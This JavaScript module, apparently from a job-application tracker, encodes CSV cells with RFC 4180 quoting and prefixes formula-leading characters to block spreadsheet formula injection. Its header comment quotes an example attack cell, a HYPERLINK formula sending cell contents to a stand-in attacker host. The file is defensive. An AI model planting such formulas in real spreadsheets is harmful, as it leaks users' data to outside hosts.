/**
 * The ONE CSV cell encoder for every spreadsheet this project writes
 * (job_tracker.csv, the dashboard export, the per-run report CSV).
 *
 * There used to be two — `csvField` in reportGenerator.js and `csvCell` in
 * dashboard/data.js — and neither neutralized formulas. Every cell here comes
 * from a job posting a stranger wrote: a title or company of
 * `=HYPERLINK("https://evil.example/?"&A1,"Apply")` is executed by Excel /
 * Sheets the moment the user opens their own tracker (CSV/formula injection,
 * OWASP). A text cell that starts with = + - @ TAB or CR is therefore prefixed
 * with a single quote, which spreadsheets render as literal text.
 *
 * Numbers are left alone: a numeric score is data, never a formula, and
 * prefixing it would turn every score column into text.
 */

/** Leading characters a spreadsheet may interpret as the start of a formula. */
const FORMULA_START = /^[=+\-@\t\r]/;

/**
 * Encode one CSV cell (RFC 4180 quoting + formula neutralization).
 *
 * @param {unknown} value arrays are joined with "; ", null/undefined -> ''
 * @returns {string}
 */
export function csvCell(value) {
  if (value === null || value === undefined) return '';
  if (typeof value === 'number' || typeof value === 'bigint') return String(value);
  let s = Array.isArray(value) ? value.join('; ') : String(value);
  if (FORMULA_START.test(s)) s = `'${s}`;
  return /[",\n\r]/.test(s) ? `"${s.replaceAll('"', '""')}"` : s;
}

/**
 * One CSV line from a list of cells.
 * @param {unknown[]} cells
 * @returns {string}
 */
export function csvRow(cells) {
  return cells.map(csvCell).join(',');
}
